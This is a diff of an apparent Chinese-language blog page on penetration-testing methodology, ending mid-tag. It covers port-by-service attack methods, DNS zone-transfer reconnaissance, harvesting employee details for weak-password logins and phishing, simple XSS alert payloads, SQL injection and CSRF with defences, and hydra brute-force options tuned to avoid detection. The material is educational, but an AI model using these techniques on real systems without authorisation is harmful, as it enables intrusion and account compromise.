@@ -429,15 +414,15 @@ function showBtn(){
 <tr>
 <td>tcp 25</td>
 <td>smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]</td>
-<td>邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
+<td>邮件伪造,vrfy&#x2F;expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
 </tr>
 <tr>
-<td>tcp/udp 53</td>
+<td>tcp&#x2F;udp 53</td>
 <td>dns[域名解析]</td>
 <td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
 </tr>
 <tr>
-<td>tcp/udp 69</td>
+<td>tcp&#x2F;udp 69</td>
 <td>tftp[简单文件传输协议,无认证]</td>
 <td>尝试下载目标及其的各类重要配置文件</td>
 </tr>
@@ -563,7 +548,7 @@ function showBtn(){
 </tr>
 <tr>
 <td>tcp 5000</td>
-<td>sybase/DB2数据库</td>
+<td>sybase&#x2F;DB2数据库</td>
 <td>爆破,注入</td>
 </tr>
 <tr>
@@ -624,7 +609,7 @@ function showBtn(){
 <tr>
 <td>tcp 9080-9081,9090</td>
 <td>websphere控制台</td>
-<td>java反序列化/弱口令</td>
+<td>java反序列化&#x2F;弱口令</td>
 </tr>
 <tr>
 <td>tcp 9200,9300</td>
@@ -664,7 +649,7 @@ function showBtn(){
 </tbody></table>
 <ul>
 <li><p>子域名信息收集</p>
-<p>  在渗透测试的时候，往往主站的防御会很强，常常无从下手，那么子站就是一个重要的突破口，因为一个企业可能对子域名的安全不是很重视，甚至有些子域名只是内测阶段还没有上线，因此子域名是渗透测试的主要关注对象，子域名搜集的越完整，那么挖到的漏洞就可能更多，甚至漏洞的级别也会更高。常用工具暴力枚举<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a>、子域名挖掘机Layer、DNS域传送漏洞、https证书日志、DNS解析记录、搜索引擎（baidu/google）、IP反查、主站爬取、shodan/fofa/zoomeye等</p>
+<p>  在渗透测试的时候，往往主站的防御会很强，常常无从下手，那么子站就是一个重要的突破口，因为一个企业可能对子域名的安全不是很重视，甚至有些子域名只是内测阶段还没有上线，因此子域名是渗透测试的主要关注对象，子域名搜集的越完整，那么挖到的漏洞就可能更多，甚至漏洞的级别也会更高。常用工具暴力枚举<a target="_blank" rel="noopener" href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a>、子域名挖掘机Layer、DNS域传送漏洞、https证书日志、DNS解析记录、搜索引擎（baidu&#x2F;google）、IP反查、主站爬取、shodan&#x2F;fofa&#x2F;zoomeye等</p>
 <p>  <strong>有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名</strong></p>
 <p>  VirusTotal：<a target="_blank" rel="noopener" href="https://www.virustotal.com/#/home/search">https://www.virustotal.com/#/home/search</a> </p>
 <p>  DNSdumpster：<a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p>
@@ -677,10 +662,11 @@ function showBtn(){
 <p>  区域传送：允许第三主服务器的数据刷新自己的区域数据库，防止主域名服务器因意外故障变得不可用时影响到这个网络。 区域传送配置错误：只要有人发出请求，就会提供一个区域数据库的拷贝，把内部主机名和ip地址暴露出来</p>
 <p>  首先,应该去查下目标的ns服务器是否允许区域传送,如果允许,直接把目标的整个子域备份过来即可，可以使用 <strong>dig</strong>（可以从该域名的官方DNS服务器上查询到精确的权威解答）或 <strong>nslookup</strong>（得到DNS解析服务器保存在Cache中的非权威解答）</p>
 <ul>
-<li>查出目标自己所有的ns记录,然后挨个尝试目标ns服务器是否允许传送（务必是目标自己的ns服务器,第三方的不算）<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">dig</span> +short @<span class="number">8.8</span>.<span class="number">8.8</span> xx.<span class="keyword">cn</span> ns</span><br><span class="line">dns.xx.<span class="keyword">cn</span>.</span><br><span class="line">dns1.xx.<span class="keyword">cn</span>.</span><br></pre></td></tr></table></figure>
-通过上面的查询,我们确定了目标自己的三个ns服务器,下面就开始来尝试逐个传送,这里还是要注意,必须用目标自己的ns服务器来解析它自己的子域</li>
+<li>查出目标自己所有的ns记录,然后挨个尝试目标ns服务器是否允许传送（务必是目标自己的ns服务器,第三方的不算）</li>
 </ul>
-  <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># dig <span class="keyword">@dns</span>.xx.cn xx.cn axfr</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9<span class="selector-class">.11</span><span class="selector-class">.3-1ubuntu1</span><span class="selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; <span class="keyword">@dns</span>.xx.cn xx.cn axfr</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.</span><br><span class="line"></span><br><span class="line"># dig <span class="keyword">@dns</span>1.xx.cn xx.cn axfr</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9<span class="selector-class">.11</span><span class="selector-class">.3-1ubuntu1</span><span class="selector-class">.1-Ubuntu</span> &lt;&lt;&gt;&gt; <span class="keyword">@dns</span>1.xx.cn xx.cn axfr</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure>
+  <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">dig</span> +short @<span class="number">8.8</span>.<span class="number">8.8</span> xx.<span class="keyword">cn</span> ns</span><br><span class="line">dns.xx.<span class="keyword">cn</span>.</span><br><span class="line">dns1.xx.<span class="keyword">cn</span>.</span><br></pre></td></tr></table></figure>
+<p>  通过上面的查询,我们确定了目标自己的三个ns服务器,下面就开始来尝试逐个传送,这里还是要注意,必须用目标自己的ns服务器来解析它自己的子域</p>
+  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dig @dns.xx.cn xx.cn axfr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.1-Ubuntu &lt;&lt;&gt;&gt; @dns.xx.cn xx.cn axfr</span></span><br><span class="line"><span class="comment">; (1 server found)</span></span><br><span class="line"><span class="comment">;; global options: +cmd</span></span><br><span class="line"><span class="comment">; Transfer failed.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dig @dns1.xx.cn xx.cn axfr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.1-Ubuntu &lt;&lt;&gt;&gt; @dns1.xx.cn xx.cn axfr</span></span><br><span class="line"><span class="comment">; (1 server found)</span></span><br><span class="line"><span class="comment">;; global options: +cmd</span></span><br><span class="line"><span class="comment">; Transfer failed.</span></span><br></pre></td></tr></table></figure>
 
 <p>  很显然,上面的这些ns服务器都不允许传送,如果目标ns服务器实在不允许传送,从其他的各种记录中获取子域,如,mx记录,spf记录,srv记录…</p>
 </li>
@@ -688,7 +674,7 @@ function showBtn(){
 <p>  通过域名MX记录查看是否为自建邮件服务器，自建的情况下可以后续测试漏洞，通过TheHarvester可以进行邮箱挖掘，没有找到漏洞也可以进行钓鱼</p>
 </li>
 <li><p>了解网站业务功能</p>
-<p>  我们需要对整个站点的整体功能有所了解，从注册用户到更改信息更改密码等等，所有的功能都需要尽可能体验一遍，在体验的同时就应该思考这个功能可能产生什么样的漏洞，比如：登陆/留言/下单/退出/退货/付款等。并且需要多注册几个账号，这对后面的csrf漏洞发现或者逻辑漏洞发现等等都很有帮助</p>
+<p>  我们需要对整个站点的整体功能有所了解，从注册用户到更改信息更改密码等等，所有的功能都需要尽可能体验一遍，在体验的同时就应该思考这个功能可能产生什么样的漏洞，比如：登陆&#x2F;留言&#x2F;下单&#x2F;退出&#x2F;退货&#x2F;付款等。并且需要多注册几个账号，这对后面的csrf漏洞发现或者逻辑漏洞发现等等都很有帮助</p>
 </li>
 <li><p>了解网站目录的结构</p>
 <p>  在开始安全测试之前, 了解应用程序的结构是至关重要的。如果不彻底了解应用程序的布局, 就不可能对其进行彻底的测试。可以通过burpsuite自动化爬虫，</p>
@@ -698,7 +684,7 @@ function showBtn(){
 <p>  通过说明文档以及网站页面收集，或者网站发表者以及留言板信息处收集账号</p>
 <p>  通过 teemo，metago，burpusit，awvs，netspker 或者 google 语法收集</p>
 <p>  搜索相关 QQ 群收集相关企业员工的社交账号</p>
-<p>  拿着姓名/手机/邮箱等到各网站搜一圈看注册信息</p>
+<p>  拿着姓名&#x2F;手机&#x2F;邮箱等到各网站搜一圈看注册信息</p>
 <p>  拿到员工的信息，我们可以尝试使用弱密码进行登录一些内部平台，并且一些员工的邮箱的前缀很可能就是他的密码。当然，如果说当一个服务不允许多次使用错误密码登录，我们可以先确定弱口令，然后爆破收集到的账号信息去爆破哪些用户使用这个弱口令从而绕过这个防护机制。</p>
 <p>  可以尝试给对方邮箱发送钓鱼邮件或木马</p>
 <p>  UitraISO+Hacksaw制作木马启动盘</p>
@@ -718,14 +704,12 @@ function showBtn(){
 <p>根据已搜集的信息进行梳理与分析，查找疏漏点进行搜集补充，从各个角度都整理一套渗透攻击步骤与思路的规划，优先以最擅长和最有把握的方面切入</p>
 <h2 id="0x03-漏洞发现"><a href="#0x03-漏洞发现" class="headerlink" title="0x03 漏洞发现"></a>0x03 漏洞发现</h2><ul>
 <li><p>漏洞扫描</p>
-<p>  关于漏洞扫描的工具太多了，一般使用awvs/newwus扫描，其他辅助工具 Nmap、msf、searchsploit(exlpoitdb)、burp、firefox插件等</p>
-<p>  但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞，需要靠平时的积累学习，且扫描器扫描会插入很多脏数据（数据库/日志等）对网站数据和服务造成破坏。</p>
-<p>  拿到环境和不同权限的测试账号后，和业务方沟通业务逻辑，先熟悉一下网站的基本功能和结构，注册/登陆/各个功能模块，从系统漏洞/中间件漏洞/web漏洞</p>
+<p>  关于漏洞扫描的工具太多了，一般使用awvs&#x2F;newwus扫描，其他辅助工具 Nmap、msf、searchsploit(exlpoitdb)、burp、firefox插件等</p>
+<p>  但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞，需要靠平时的积累学习，且扫描器扫描会插入很多脏数据（数据库&#x2F;日志等）对网站数据和服务造成破坏。</p>
+<p>  拿到环境和不同权限的测试账号后，和业务方沟通业务逻辑，先熟悉一下网站的基本功能和结构，注册&#x2F;登陆&#x2F;各个功能模块，从系统漏洞&#x2F;中间件漏洞&#x2F;web漏洞</p>
 </li>
-</ul>
-<ul>
 <li><p>sql注入</p>
-<p>  <strong>定义</strong>：Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，黑客可以利用该漏洞执行任意SQL语句。<br><br>  掌握常用的sql注入手法，熟练使用sqlmap或者同类工具。还需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。<br><br>  **其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!**，还需要注意的是如后端语句使用了<code>insert</code>可能一个简单的逻辑判断都能把整个表给篡改了，要注意备份<br><br>  <strong>何防止SQL注入：</strong><br></p>
+<p>  <strong>定义</strong>：Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，黑客可以利用该漏洞执行任意SQL语句。<br><br>  掌握常用的sql注入手法，熟练使用sqlmap或者同类工具。还需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。<br><br>  <strong>其次作为白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</strong>，还需要注意的是如后端语句使用了<code>insert</code>可能一个简单的逻辑判断都能把整个表给篡改了，要注意备份<br><br>  <strong>何防止SQL注入：</strong><br></p>
 <ul>
 <li>不信任用户的输入；</li>
 <li>不使用动态拼接sql，可使用参数化的sql或直接使用存储过程进行数据查询存取；</li>
@@ -744,15 +728,17 @@ function showBtn(){
 <p>  <strong>XSS可能发生的场景</strong></p>
 <ol>
 <li><p>在HTML标签中输出</p>
- <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--在这种场景下，XSS的利用方式一般是构造一个&lt;script&gt;标签，或者是任何能够产生脚本执行的方式。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--在这种场景下，XSS的利用方式一般是构造一个&lt;script&gt;标签，或者是任何能够产生脚本执行的方式。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>在HTML属性中输出</p>
- <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--灵活构造XSS PAYLOAD--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot; &gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--灵活构造XSS PAYLOAD--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;&quot; &gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>在<code>&lt;script&gt;</code>标签中输出 </p>
- <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--攻击者需要先闭合引号才能实施XSS攻击--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;alert(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--攻击者需要先闭合引号才能实施XSS攻击--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
 <li><p>在事件中输出</p>
  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;$var&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--可能的攻击方法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;);alert(/xss/);  //&#x27;)&quot;</span>     &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
 <li><p>在CSS中输出</p>
- <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">$&#123;xss&#125;</span>);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>($&#123;xss&#125;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">在CSS中输出同样存在XSS的风险，如：</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;</span>)<span class="string">&quot;);&#125;</span></span><br><span class="line"><span class="string">body &#123;background-image:expression(alert(/xss/));&#125;</span></span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;<span class="selector-tag">text</span>/css&quot;&gt;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">$&#123;xss&#125;</span>);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>($&#123;xss&#125;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">在CSS中输出同样存在XSS的风险，如：</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/xss/));&#125;</span><br></pre></td></tr></table></figure></li>
 <li><p>在地址中输出<br> 6.1 在URL的path（路径）或者search（参数）中输出</p>
  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.evil.com/?test=$var&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.evil.com/?test=&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&quot;&quot; &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p> 防御方法：使用URLEncode</p>
@@ -769,7 +755,7 @@ function showBtn(){
 <li>只允许用户输入我们期望的数据，如年龄的textbox中只允许输入数字，其余过滤；</li>
 <li>对数据进行Html Encode处理，如&lt;转化为&amp;lt；、&amp;转化为&amp;amp；</li>
 <li>过滤或移除特殊的Html标签，如：script、iframe；</li>
-<li>过滤JavaScript事件的标签，如“onclick=”、“onfocus”等等。</li>
+<li>过滤JavaScript事件的标签，如“onclick&#x3D;”、“onfocus”等等。</li>
 </ul>
 </li>
 <li><p>上传漏洞</p>
@@ -783,11 +769,11 @@ function showBtn(){
 <p>  逻辑漏洞包括任意重置用户密码，修改订单等等，这类漏洞是扫描器所不能扫描出来的，所以需要我们认真分析整个站点的功能，分析其逻辑，多用burpsuite抓包观察数据包是否可篡改，验证码是否可爆破等等</p>
 </li>
 <li><p>csrf</p>
-<p>  <strong>定义</strong>：是指攻击者通过伪装来自受信任用户的请求来利用受信任的站点，强制对已完成认证的用户进行非预期的个人信息或设定信息等某种状态更新，也就是说攻击者盗用了你的身份，以你的名义发送恶意请求。<br><br>  攻击者迫使web应用的用户去执行攻击者预设的操作，如果服务器没有合适的防御措施，用户即使访问熟悉的可信网站（生成的poc可以隐藏到论坛/blog等用户生成内容的网站中）也有受到攻击的危险</p>
+<p>  <strong>定义</strong>：是指攻击者通过伪装来自受信任用户的请求来利用受信任的站点，强制对已完成认证的用户进行非预期的个人信息或设定信息等某种状态更新，也就是说攻击者盗用了你的身份，以你的名义发送恶意请求。<br><br>  攻击者迫使web应用的用户去执行攻击者预设的操作，如果服务器没有合适的防御措施，用户即使访问熟悉的可信网站（生成的poc可以隐藏到论坛&#x2F;blog等用户生成内容的网站中）也有受到攻击的危险</p>
 <p>  攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
 <p>  因此对于用户来说很难避免在登陆一个网站之后不点击一些链接进行其他操作，所以随时可能成为CSRF的受害者。</p>
 <p>  检测csrf漏洞一般是看每一个操作是否有验证码验证，是否有token或者referer,可以注册多个账户然后利用A用户生成的poc去检测B用户，poc可以通过burpsuite去生成<br></p>
-<p>  <strong>功能使用的是请求/响应模式</strong></p>
+<p>  <strong>功能使用的是请求&#x2F;响应模式</strong></p>
 <p>  如何防止CSRF跨站请求攻击：<br></p>
 <ul>
 <li><p>在web站点，将持久化的授权（例如cookie或者http授权）切换为瞬时的授权方法（在每个form中提供隐藏field）；</p>
@@ -805,8 +791,6 @@ function showBtn(){
 </li>
 </ul>
 </li>
-</ul>
-<ul>
 <li><p>未授权访问</p>
 <p>  这里所指的未授权包括各种空密码之类的，这种漏洞危害是不言而喻的</p>
 </li>
@@ -814,11 +798,12 @@ function showBtn(){
 <p>  可以通过爆破的方式发现弱口令，web可以使用burpsuite，服务可以使用hydra</p>
 <p>  <strong>hydra简单使用</strong></p>
 <p>  项目地址：<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
-<p>  hydra可以运行在Linux, Windows/Cygwin, Solaris, FreeBSD/OpenBSD, QNX (Blackberry 10) and MacOS</p>
-<p>  支持的协议包括：Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</p>
-  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">R	从上次未完成的爆破文件[hydra.restore]中读取爆破进度并接着上次的进度继续往后爆破</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">S 	爆破https时需要加上该选项</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">s 	如果要爆破的服务用的不是默认端口,可以用这个来手工指定服务端口号</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">l/-L 	指定用户名 / 指定用户名字典文件</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">p/-P 	指定密码 / 指定密码字典文件[字典务必要自己精心准备,别人的始终不适合自己的环境]</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">e 	尝试空密码[n]/尝试将用户名作为密码[s]/尝试将用户名和密码位置调换爆破[r]</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">f/-F 	当爆出第一个正确的密码后,就自动退出程序,-f表示单个<span class="string">&#x27;进程&#x27;</span>退出,-F表示全局退出</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">t 	指定爆破进程,实际爆破中给<span class="number">8</span>个左右即可,太高了容易报警,速度慢不怕,就怕动静儿太大,这里只是个参考,如果目标内网环境相对比较松,可以适当再放大一点,当然,肯定不能    无限大,基于目标系统而定,大家酌情使用吧</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby">w 	设定超时时长,默认<span class="number">32</span>秒,一般情况<span class="number">10</span>秒即可</span></span><br><span class="line"><span class="ruby"></span>-<span class="ruby"><span class="number">4</span>/-<span class="number">6</span> 	<span class="number">4</span>表示用ipv4,<span 